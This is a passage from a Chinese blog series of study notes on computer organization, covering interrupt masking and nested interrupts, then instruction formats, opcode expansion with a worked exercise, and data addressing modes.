class="markdownIt-Anchor" href="#保护和恢复现场"></a> 保护和恢复现场</h4><p>保护现场，指的是保存当前执行程序的断点地址以及寄存器中的内容。前者由中断隐指令完成，而后者交由中断服务程序完成。一般来说，是把当前过程中寄存器的值入栈来实现对现场的保护。</p><p>恢复现场，即跳转回原程序的断点地址并恢复其寄存器的内容，全部由中断服务程序完成。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620170454344.png" alt="image-20240620170454344" style="zoom:50%;" /><p>即把寄存器内容<code>POP</code>出栈，然后调用<code>IRET</code>指令返回。</p><h4 id="中断屏蔽技术"><a class="markdownIt-Anchor" href="#中断屏蔽技术"></a> 中断屏蔽技术</h4><h5 id="多重中断"><a class="markdownIt-Anchor" href="#多重中断"></a> 多重中断</h5><p>前面我们说过，对于单重中断而言，如果进入中断程序，是不允许响应其他中断的。但如果在执行中断服务程序的过程中，出现了更重要的，需要及时处理的新事件，怎么办呢？这时候我们引入了多重中断屏蔽技术。</p><p>多重中断，即CPU在响应某个中断服务程序时，出现了新的中断请求，CPU又响应了这个请求。此时，CPU就会暂时停止这个服务程序，转去执行新的中断服务程序，执行完毕后再返回执行原来的中断服务程序。即“中断的中断”，又称为中断嵌套。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620171033609.png" alt="image-20240620171033609" style="zoom:50%;" /><p>要实现多重中断，需要满足以下条件：</p><ol><li>提前设置开中断指令，否则CPU不会响应可屏蔽中断。</li><li>优先级别高的中断源有权中断优先级别低的中断源。</li></ol><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620171411538.png" alt="image-20240620171411538" style="zoom:50%;" /><p>如上图所示，中断源优先级为A&gt;B&gt;C&gt;D。可以看到D在返回的过程中，接收到了中断源A的信号。此时CPU转而去执行中断A，然后再转回执行中断D，最后返回。</p><p>在中断B执行完后，C的中断请求还在，此时CPU只要发出中断查询信号就可以继续执行中断。</p><h5 id="屏蔽技术"><a class="markdownIt-Anchor" href="#屏蔽技术"></a> 屏蔽技术</h5><p>我们通过硬件屏蔽触发器来设计中断屏蔽字，来改变中断优先级，提高系统的灵活性。</p><p>将排队器集中在CPU内，加上屏蔽条件，就可以组成具有屏蔽功能的排队器，如图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620172902781.png" alt="image-20240620172902781" style="zoom:50%;" /><p>每个中断请求触发器都对应有一个屏蔽触发器，将所有的屏蔽触发器组合在一起，就可以构成一个屏蔽寄存器，屏蔽寄存器的内容称为屏蔽字。屏蔽字的内容和中断源的级别一一对应。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620173142882.png" alt="image-20240620173142882" style="zoom:50%;" /><p>直观来看，<strong>就是说屏蔽字的数值越大，它的优先级越高</strong>。</p><p>通过设置屏蔽字，我们就可以改变<strong>处理优先等级</strong>。注意区分处理优先等级和响应优先等级的概念。</p><ul><li>响应优先级：是CPU通过轮询中断触发器实现的，因为是通过硬件确定的，所以不可改变。</li><li>处理优先级：可以通过更改屏蔽字来改变CPU对中断触发器的处理优先级。</li></ul><p>也就是说，通过设置屏蔽字，CPU仍然会按照硬件设计的顺序优先响应排在前面的中断源，但是在这之后，中断服务程序可能会被优先级更高的屏蔽字打断，转而去处理其他中断服务程序。</p><p>比如有如下中断源：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620173902475.png" alt="image-20240620173902475" style="zoom:50%;" /><p>如果ABCD同时发出中断请求，就会有如下过程：</p><ol><li>首先，CPU优先响应请求A，此时A的处理优先级也是最高，没有中断程序打断，所以CPU会先执行完A的中断服务程序。</li><li>接着，CPU优先响应请求B，但是B的处理优先级低于D和C，所以将被打断。</li><li>C的响应优先级高于D，故CPU优先响应请求C，但是C的处理优先级低于D，故被D打断。</li><li>现在CPU开始处理请求D，没有被打断，于是处理完D的中断服务程序。</li><li>CPU处理完D转回处理中断C。</li><li>CPU处理C未遭打断，故成功执行完中断服务程序C。</li><li>最后，CPU转回处理并执行完中断服务程序B。</li></ol><p>以上过程绘图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620174630650.png" alt="image-20240620174630650" style="zoom:50%;" /><p>注意，所有中断只会被响应一次。在处理完一个中断请求后，不需要再次响应已经被响应过的中断，而是直接返回处理原先的中断。</p><p>在开启屏蔽字技术后，中断处理请求流程图增加了置屏蔽字和恢复屏蔽字部分，绘图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240620175626160.png" alt="image-20240620175626160" style="zoom:50%;" /><p>在恢复现场前关中断是为了防止恢复过程中被新的中断打断，在恢复现场和屏蔽字后，必须要重新打开中断。</p><p>……</p><p>……</p><p>第五部分到此结束！敬请阅读第六部分💸</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/105468887_p0.jpg" alt="11" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> CPU的结构与功能 </tag>
            
            <tag> 周期流水 </tag>
            
            <tag> 中断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（四）</title>
      <link href="/posts/f96ae6cd0b44/"/>
      <url>/posts/f96ae6cd0b44/</url>
      
        <content type="html"><![CDATA[<h2 id="第七章-指令系统"><a class="markdownIt-Anchor" href="#第七章-指令系统"></a> 第七章 指令系统</h2><blockquote><p>难度相对不大</p><p>扩展操作码技术<br />寻址方式包括指令的寻址和操作数的寻址，了解概念<br />指令集 risc和cisc的区别表</p></blockquote><p>至此，我们算是介绍完了计算机底层的硬件部分，最基础的M0层学习完毕🍾🍾🍾！</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/Cache_577189bb64f13db1.jpg" alt="Cache_577189bb64f13db1" /></p><p>呃等等，后面还有更难的M1层还没开始学呢……褒姒了。（还记得记得M0和M1吗？如果记不得就去复习下前面的计算机层次结构）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/Cache_6818278e85975c59.jpg" alt="Cache_6818278e85975c59" /></p><p>不管怎么说，从这章开始，我们正式开始介绍计算机的指令系统，了解计算机是如何通过微指令的方式与硬件系统交互实现相应的功能。</p><h3 id="机器指令"><a class="markdownIt-Anchor" href="#机器指令"></a> 机器指令</h3><p>一般来说，指令的格式如下图所示：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618212628477.png" alt="image-20240618212628477" /></p><p>顾名思义，操作码就是指示计算机应该做出什么样的控制行为，地址码则代表执行操作的内存地址（前提是该操作涉及到了与数据的交互）。</p><h4 id="操作码"><a class="markdownIt-Anchor" href="#操作码"></a> 操作码</h4><p>指令中的操作码反映了机器该做出什么样的操作。操作码的长度可以是固定的，也可以是可变的。前者比如RISC、IBM370等指令字较长时使用，后者则在字长较短的微型计算机被广泛采用，如Intel8086等。一般来说，可变长度的操作码会使控制器的设计变得复杂，所以我们采用<strong>扩展操作码技术</strong>对操作码进行扩充，从而减少指令字长。所谓扩展操作码技术，即通过减少地址码字段的长度来扩充操作码，从而保持指令字段整体长度不变。</p><p>以下是一种扩展操作码的安排示意图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619152949278.png" alt="image-20240619152949278" style="zoom:50%;" /><p>我们可以很容积总结出扩展操作码的规律：十六位指令码分为四组，每一个小组由2<sup>4</sup>种组合，除零地址指令外，需要抽出1111来标识进入下一组，故每种地址指令（除零地址指令外）均有2<sup>4</sup>-1=15条。</p><p>如果需要进一步扩展操作码，可以通过减少地址指令条数来实现。比如三地址指令操作码，每减少一种可多构成2<sup>4</sup> 种二地址指令；二地址指令操作码，每减少一种可多构成2<sup>4</sup> 种一地址指令。这是因为每减少一条高地址指令，就会增加低地址指令额外的组成种类。</p><blockquote><p>例题：设指令字长16位，操作数地址码6位，指令有零地址、一地址、二地址3种。</p><p>（1）若操作码长度固定，零地址指令P种，一地址指令Q种，则二地址指令最多几种？</p><p>地址码6位，支持二地址指令，则操作码位数为</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mtext>−</mtext><mn>6</mn><mtext>−</mtext><mn>6</mn><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">16−6−6=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mord">−</span><span class="mord">6</span><span class="mord">−</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span></p><p>则总共有2<sup>4</sup>=16种指令，由于操作码长度固定，则二地址指令最多：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mtext>−</mtext><mi>P</mi><mtext>−</mtext><mi>Q</mi></mrow><annotation encoding="application/x-tex">16−P−Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">−</span><span class="mord mathnormal">Q</span></span></span></span></p><p>（2）采用扩展操作码技术，若二地址指令X种，零地址指令Y种，则一地址指令最多几种？</p><p>二地址指令每减少一种，可构成2<sup>6</sup>种一地址指令，一地址指令每减少一种，可构成2<sup>6</sup>种零地址，二地址指令X种，则一地址指令最多：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mn>4</mn></msup><mtext>−</mtext><mi>X</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">(2^4−X)×2^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>种</p><p>设一地址指令M种，则零地址指令最多<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>4</mn></msup><mtext>−</mtext><mi>X</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup><mtext>−</mtext><mi>M</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">((2^4−X)×2^6 −M)×2^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>种，因零地址指令Y种，解方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>4</mn></msup><mtext>−</mtext><mi>X</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup><mtext>−</mtext><mi>M</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup><mo>=</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">((2^4−X)×2^6 −M)×2^6=Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></p><p>可得一地址指令最多：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mn>2</mn><mn>4</mn></msup><mtext>−</mtext><mi>X</mi><mo stretchy="false">)</mo><mo>×</mo><msup><mn>2</mn><mn>6</mn></msup><mtext>−</mtext><mi>Y</mi><mo>×</mo><msup><mn>2</mn><mrow><mo>−</mo><mn>6</mn></mrow></msup></mrow><annotation encoding="application/x-tex">M=(2^4−X)×2^6−Y×2^{-6}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span></p></blockquote><h4 id="地址码"><a class="markdownIt-Anchor" href="#地址码"></a> 地址码</h4><p>地址码用来指出该指令的源操作数的地址（一个或两个）、结果的地址以及下一条指令的地址，又分四地址操作码、三地址操作码、二地址操作码以及一地址操作码。</p><p>假设指令字长为32位，其中操作码固定8位，则有：</p><ul><li><p>四地址</p><p>寻址范围：2<sup>6</sup>=64</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619155842877.png" alt="image-20240619155842877" /></p></li><li><p>三地址</p><p>寻址范围：2<sup>8</sup>=256</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619160231545.png" alt="image-20240619160231545" /></p></li><li><p>二地址</p><p>寻址范围：2<sup>12</sup>=4K</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619160327394.png" alt="image-20240619160327394" /></p></li><li><p>一地址</p><p>寻址范围：2<sup>24</sup>=16M</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619160340900.png" alt="image-20240619160340900" /></p></li><li><p>零地址</p><p>零地址指令在指令字中无地址码，要么是不需要操作数的指令（空操作NOP、HLT停机等），要么是其操作数地址隐藏在堆栈中（子程序返回RET、中断返回IRET等）</p></li></ul><h4 id="指令字长"><a class="markdownIt-Anchor" href="#指令字长"></a> 指令字长</h4><p>早期的计算机指令字长一般是固定的，所以只需要取出固定的字长就可以执行指令。但是现在的计算机，指令字长一般是可变的。为了提高运行速度和节省存储空间，一般把指令设计为按字节的倍数变化。</p><h3 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h3><p>寻址方式，即确定本条指令的操作数地址及下一条欲执行指令的指令地址。分为指令寻址和数据寻址。了解概念即可。</p><h4 id="指令寻址"><a class="markdownIt-Anchor" href="#指令寻址"></a> 指令寻址</h4><p>指令寻址的方式比较简单，即由程序计数器PC（Program Counter）按顺序指向下一条指令即可。如果遇到跳跃指令，则由跳跃指令指出下一条指令的地址。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619161533737.png" alt="image-20240619161533737" style="zoom:50%;" /><h4 id="数据寻址"><a class="markdownIt-Anchor" href="#数据寻址"></a> 数据寻址</h4><p>一般来说，数据寻址的格式如下图所示：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619162256574.png" alt="image-20240619162256574" style="zoom:50%;" /><p>操作码代表对数据执行操作的类型；寻址特征代表执行什么样的寻址；形式地址A则储存数据的相关信息，它可能就是数据本身，也可能是数据所在的真实地址，也可能是数据所在地址的地址。一般来说，指令地址码中的字段通常不代表操作数的真实地址。</p><p>方便起见，我们约定指令字长=存储字长=机器字长；形式地址记为A，真实地址/有效地址记为EA。</p><blockquote><ol><li><strong>指令字长</strong>：指令字长是指CPU一次能够处理的指令的位数。在某些体系结构中，所有的指令都是固定长度的，例如16位、32位或64位。</li><li><strong>存储字长</strong>：存储字长是指存储器中每个存储单元能够存储的数据的位数。这通常与指令字长相同，意味着存储器中的每个单元可以存储相同数量的位。</li><li><strong>机器字长</strong>：机器字长是指CPU在执行算术和逻辑操作时能够一次性处理的数据位数。这通常与指令字长和存储字长相同，这样设计可以简化计算机的内部逻辑和提高效率。</li></ol></blockquote><p>数据寻址方式相对复杂，共有十种数据寻址方式，现一一介绍如下：</p><h5 id="立即寻址"><a class="markdownIt-Anchor" href="#立即寻址"></a> 立即寻址</h5><p>立即寻址时，此时形式地址A就是操作数，即输入立即数。</p><p>特点：</p><ul><li>指令执行阶段不访存</li><li>立即数是采用补码存放的，所以可正可负</li><li>A的位数限制了输入立即数的范围</li></ul><h5 id="直接寻址"><a class="markdownIt-Anchor" href="#直接寻址"></a> 直接寻址</h5><p>直接寻址时，有效地址由形式地址直接给出，EA=A。</p><p>特点：</p><ul><li>执行阶段访问一次寄存器</li><li>A的位数决定了该指令操作数的寻址范围</li><li>操作数的地址不易修改，此时必须要修改A</li></ul><h5 id="隐含寻址"><a class="markdownIt-Anchor" href="#隐含寻址"></a> 隐含寻址</h5><p>隐含寻址时，操作数地址隐含在操作码中。</p><p>比如8086的MUL指令，被乘数隐含在 AX（16位）或 AL（8位）中；MOVS 指令，源操作数的地址隐含在 SI 中，目的操作数的地址隐含在 DI 中。</p><p>特点：</p><ul><li>指令字中少了一个地址字段，可缩短指令字长</li></ul><h5 id="间接寻址"><a class="markdownIt-Anchor" href="#间接寻址"></a> 间接寻址</h5><p>间接寻址时，有效地址由形式地址间接提供，即形式地址指向真实地址的地址，类似指针的概念。间接寻址的次数视具体情况而定。EA=(A)。</p><p>特点：</p><ul><li>执行指令阶段会进行2次或多次访存</li><li>可以扩大寻址范围</li><li>便于编制程序，指针的运用十分方便</li></ul><h5 id="寄存器寻址"><a class="markdownIt-Anchor" href="#寄存器寻址"></a> 寄存器寻址</h5><p>寄存器寻址时，有效地址即为寄存器编号，数据储存在寄存器中，EA=R<sub>i</sub>。</p><p>特点：</p><ul><li>执行阶段不访存，只访问寄存器，执行速度快</li><li>寄存器个数有限，故指令字较短，可以缩短指令字长</li></ul><h5 id="寄存器间接寻址"><a class="markdownIt-Anchor" href="#寄存器间接寻址"></a> 寄存器间接寻址</h5><p>寄存器间接寻址时，有效地址在寄存器编号中，EA=(R<sub>i</sub>)。</p><p>特点：</p><ul><li>有效地址在寄存器中，操作数在存储器中，执行阶段访存。它比间接寻址少访存一次。</li><li>一般用于编制循环程序</li></ul><h5 id="基址寻址"><a class="markdownIt-Anchor" href="#基址寻址"></a> 基址寻址</h5><p>基址寻址又分为两种：隐式基址寻址和显示基址寻址。</p><h6 id="隐式基址寻址"><a class="markdownIt-Anchor" href="#隐式基址寻址"></a> 隐式基址寻址</h6><p>即采用专用寄存器作基址寄存器，此时EA=(BR)+A，BR为基址寄存器。</p><p>例如8086CPU中，默认DS为段地址寄存器，DI为段偏移地址寄存器。在访问数据时，真实的内存地址表现为：DS*16+DI，扩大了数据表示范围。</p><p>特点：</p><ul><li>可扩大寻址范围</li><li>有利于多道程序</li><li>BR的内容由操作系统或者管理程序确定</li><li>在程序执行过程中BR内容不变，形式地址可变</li></ul><h6 id="显示基址寻址"><a class="markdownIt-Anchor" href="#显示基址寻址"></a> 显示基址寻址</h6><p>即采用通用寄存器作基址寄存器，此时EA=(R<sub>0</sub>)+A，R<sub>0</sub>为用户自己指定的通用寄存器。</p><p>特点：</p><ul><li>由用户指定哪个通用寄存器作为基址寄存器</li><li>基址寄存器的内容由操作系统确定</li><li>在程序的执行过程中 R0  内容不变，形式地址 A 可变</li></ul><h5 id="变址寻址"><a class="markdownIt-Anchor" href="#变址寻址"></a> 变址寻址</h5><p>变址寻址与基址寻址极为相似，其有效地址EA等于指令字中的形式地址A与变址寄存器的内容相加之和，即EA=A+(IX)。</p><p>由于两者的应用场合不同，所以我们主要通过应用场景来区分变址寻址和基址寻址。基址寻址主要用于为程序或数据分配存储空间，由操作系统或管理程序决定，故程序执行过程中其值不可变；而变址寻址的内容是由用户设定的，在执行过程中内容可变，而指令字的A不可变，主要用来处理<strong>数组问题</strong>。</p><p>比如在数组处理过程中，设定A为数组的首地址，然后通过改变变址寄存器的值来访问数组的各个元素，特别适合编制循环程序。</p><p>特点如下：</p><ul><li>可以扩大寻址范围</li><li>IX的内容由用户给定</li><li>在程序的执行过程中 IX 内容可变，形式地址 A 不变</li><li>便于处理数组问题</li></ul><h5 id="相对寻址"><a class="markdownIt-Anchor" href="#相对寻址"></a> 相对寻址</h5><p>相对寻址的有效地址是将程序计数器PC的内容（即当前指令地址）与指令字中的形式地址相加而成，即EA=(PC)+A。A 是相对于当前指令的位移量（可正可负，补码）</p><p>特点：</p><ul><li>A的位数决定操作数的寻址范围</li><li>对于编写浮动程序特别有利，无论程序在主存的哪段区域都能正常运行</li><li>广泛应用于转移指令</li></ul><h5 id="堆栈寻址"><a class="markdownIt-Anchor" href="#堆栈寻址"></a> 堆栈寻址</h5><p>堆栈可以分为硬堆栈和软堆栈两种，前者由多个寄存器实现，后者由指定的存储空间实现。堆栈的运行方式可以分为先进后出和先进先出两种。先进后出型堆栈的操作数只能从一个出入口进行读写，栈顶地址由寄存器SP指出。因此堆栈寻址本质上也可以视为寄存器间接寻址。</p><p>整理表格如下：</p><table><thead><tr><th>寻址方式</th><th>说明</th><th>特点</th></tr></thead><tbody><tr><td>立即寻址</td><td>此时形式地址A就是操作数，即输入立即数。</td><td>- 指令执行阶段不访存<br> - 立即数是采用补码存放的，所以可正可负<br> - A的位数限制了输入立即数的范围</td></tr><tr><td>直接寻址</td><td>有效地址由形式地址直接给出，EA=A。</td><td>- 执行阶段访问一次寄存器<br> - A的位数决定了该指令操作数的寻址范围<br> - 操作数的地址不易修改，此时必须要修改A</td></tr><tr><td>隐含寻址</td><td>操作数地址隐含在操作码中。</td><td>- 指令字中少了一个地址字段，可缩短指令字长</td></tr><tr><td>间接寻址</td><td>有效地址由形式地址间接提供，即形式地址指向真实地址的地址，类似指针的概念。</td><td>- 执行指令阶段会进行2次或多次访存<br> - 可以扩大寻址范围<br> - 便于编制程序，指针的运用十分方便</td></tr><tr><td>寄存器寻址</td><td>有效地址即为寄存器编号，数据储存在寄存器中，EA=R<sub>i</sub>。</td><td>- 执行阶段不访存，只访问寄存器，执行速度快<br> - 寄存器个数有限，故指令字较短，可以缩短指令字长</td></tr><tr><td>寄存器间接寻址</td><td>有效地址在寄存器编号中，EA=(R<sub>i</sub>)。</td><td>- 有效地址在寄存器中，操作数在存储器中，执行阶段访存。它比间接寻址少访存一次。<br> - 一般用于编制循环程序</td></tr><tr><td>基址寻址</td><td>基址寻址分为隐式基址寻址和显示基址寻址。</td><td></td></tr><tr><td>隐式基址寻址</td><td>采用专用寄存器作基址寄存器，此时EA=(BR)+A，BR为基址寄存器。</td><td>- 可扩大寻址范围<br> - 有利于多道程序<br> - BR的内容由操作系统或者管理程序确定<br> - 在程序执行过程中BR内容不变，形式地址可变</td></tr><tr><td>显示基址寻址</td><td>采用通用寄存器作基址寄存器，此时EA=(R<sub>0</sub>)+A，R<sub>0</sub>为用户自己指定的通用寄存器。</td><td>- 由用户指定哪个通用寄存器作为基址寄存器<br> - 基址寄存器的内容由操作系统确定<br> - 在程序的执行过程中 R0 内容不变，形式地址 A 可变</td></tr><tr><td>变址寻址</td><td>有效地址EA等于指令字中的形式地址A与变址寄存器的内容相加之和，即EA=A+(IX)。</td><td>- 可以扩大寻址范围<br> - IX的内容由用户给定<br> - 在程序的执行过程中 IX 内容可变，形式地址 A 不变<br> - 